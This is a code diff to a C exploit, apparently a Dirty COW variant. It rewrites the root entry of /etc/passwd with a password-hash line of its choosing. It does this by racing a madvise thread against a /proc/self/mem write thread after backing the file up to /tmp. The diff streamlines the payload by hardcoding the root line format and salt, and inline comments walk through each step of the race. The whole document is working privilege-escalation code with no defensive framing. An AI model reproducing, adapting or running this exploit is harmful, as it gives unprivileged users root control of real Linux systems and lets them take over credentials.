@@ -14,37 +14,13 @@
 
 char *filename = "/etc/passwd";
 char *backup_filename = "/tmp/passwd.bak";
-char *salt = "root";
+char *salt = "JZ";
 
 void *map;
 int f;
 struct stat st;
 
-struct Userinfo {
-   char *username;
-   char *hash;
-   int user_id;
-   int group_id;
-   char *info;
-   char *home_dir;
-   char *shell;
-};
-
-char *generate_password_hash(char *plaintext_pw) {
-  return crypt(plaintext_pw, salt);
-}
-
-char *generate_passwd_line(struct Userinfo u) {
-  const char *format = "%s:%s:%d:%d:%s:%s:%s\n\0";
-  int size = snprintf(NULL, 0, format, u.username, u.hash,
-    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
-  char *ret = malloc(size + 1);
-  sprintf(ret, format, u.username, u.hash, u.user_id,
-    u.group_id, u.info, u.home_dir, u.shell);
-  printf("passwd line: %s", ret);
-
-  return ret;
-}
+char * passwd_line="root:%s:0:0:root:/root:/bin/bash\n\0";
 
 int copy_file(const char *from, const char *to) {
   // check if target file already exists
@@ -130,19 +106,17 @@ int main(int argc, char *argv[])
     exit(ret);
   }
 
-  struct Userinfo user;
-  // set values, change as needed
-  user.username = "root";
-  user.user_id = 0;
-  user.group_id = 0;
-  user.info = "root";
-  user.home_dir = "/root";
-  user.shell = "/bin/bash";
-
+  char* hash;
   char *plaintext_pw = "mypassword";
-  user.hash = generate_password_hash(plaintext_pw);
+  hash = crypt(plaintext_pw, salt);
+  int size = snprintf(NULL, 0, passwd_line, hash);
+  printf("\nsize=%d\n",size);
+  char * line= malloc(size + 1);
+  sprintf(line, passwd_line, hash);
+  printf("passwd line: %s", line);
 
-  char *complete_passwd_line = generate_passwd_line(user);
+
+  //char *complete_passwd_line = generate_passwd_line(user);
   printf("try to insert a new user\n");
 /*
 You have to open the file in read only mode.
@@ -169,13 +143,14 @@ You have to open with PROT_READ.
 You have to do it on two threads.
 */
   pthread_create(&pth1,NULL,madviseThread,filename);
-  pthread_create(&pth2,NULL,procselfmemThread,complete_passwd_line);
+  pthread_create(&pth2,NULL,procselfmemThread,line);
 
 /*
 You have to wait for the threads to finish.
 */
   pthread_join(pth1,NULL);
   pthread_join(pth2,NULL);
+  free(line);
 
   return 0;
 }
